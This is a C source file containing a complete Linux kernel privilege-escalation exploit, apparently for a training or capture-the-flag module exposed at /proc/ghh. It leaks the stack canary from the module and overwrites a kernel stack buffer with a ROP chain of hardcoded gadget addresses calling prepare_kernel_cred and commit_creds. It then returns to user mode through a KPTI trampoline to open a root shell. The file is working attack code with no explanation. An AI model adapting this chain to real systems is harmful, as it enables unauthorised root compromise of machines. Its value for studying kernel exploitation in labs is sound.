#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/mman.h>

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}

void shell(void){

    if (getuid() != 0) {
        printf("UID = %d :-(\n", getuid());
        exit(-1);
    }

    system("/bin/sh");
}

unsigned long user_rip = (unsigned long) shell;

int main() {

    save_state();

    int fd = open("/proc/ghh", O_RDWR);
    if (fd < 0) {
        puts("Failed to open /proc/ghh");
        exit(-1);
    }

    unsigned long leak[5];;
    read(fd, leak, sizeof(leak));

    unsigned long canary = leak[1];
    printf("Canary = 0x%016lx\n", canary);

    unsigned long payload[40] = { 0 };
    payload[1] = canary;

    int i = 4;

    payload[i++] = 0xffffffff811ad2ec; // pop rdi; ret;
    payload[i++] = 0;

    payload[i++] = 0xffffffff8106b6a0; // prepare_kernel_cred
    payload[i++] = 0xffffffff8100534f; // mov r8, rax; mov rax, r8; ret;
    payload[i++] = 0xffffffff81113e1b; // mov rdx, r8; ret;
    payload[i++] = 0xffffffff811b794e; // mov rdi, rax; cmp rdi, rdx; jne 0x3b7945; xor eax, eax; ret;

    payload[i++] = 0xffffffff8106b500; // commit_creds

    payload[i++] = 0xffffffff81400cc6; // common_interrupt_return+22: mov rdi,rsp
    payload[i++] = 0;
    payload[i++] = 0;
    payload[i++] = user_rip;
    payload[i++] = user_cs;
    payload[i++] = user_rflags;
    payload[i++] = user_sp;
    payload[i++] = user_ss;

    write(fd, payload, sizeof(payload));

    return 0;
}

